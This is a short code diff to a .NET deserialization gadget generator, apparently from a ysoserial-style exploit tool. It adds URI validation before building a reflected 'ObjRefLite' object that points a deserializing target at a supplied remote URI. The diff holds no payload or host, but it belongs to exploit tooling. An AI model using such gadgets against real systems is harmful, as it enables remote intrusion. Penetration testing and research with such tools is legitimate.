@@ -38,7 +38,14 @@ namespace ysonet.Generators
 
         public override object Generate(string formatter, InputArgs inputArgs)
         {
-            var uri = new Uri(inputArgs.Cmd, UriKind.Absolute);
+            var uri_string = inputArgs.Cmd;
+            if (!Uri.IsWellFormedUriString(uri_string, UriKind.Absolute))
+            {
+                Console.WriteLine("The cmd needs to be a Uri for this gadget.");
+                System.Environment.Exit(-1);
+            }
+
+            var uri = new Uri(uri_string, UriKind.Absolute);
             switch (uri.Scheme)
             {
                 case "http":
@@ -57,7 +64,7 @@ namespace ysonet.Generators
             // create an ObjRef with the given URL and make it a ObjRefLite
             var objRef = new ObjRef()
             {
-                URI = inputArgs.Cmd,
+                URI = uri.ToString(),
             };
             typeof(ObjRef).InvokeMember("SetObjRefLite", BindingFlags.NonPublic | BindingFlags.Instance | BindingFlags.InvokeMethod, null, objRef, null);
 
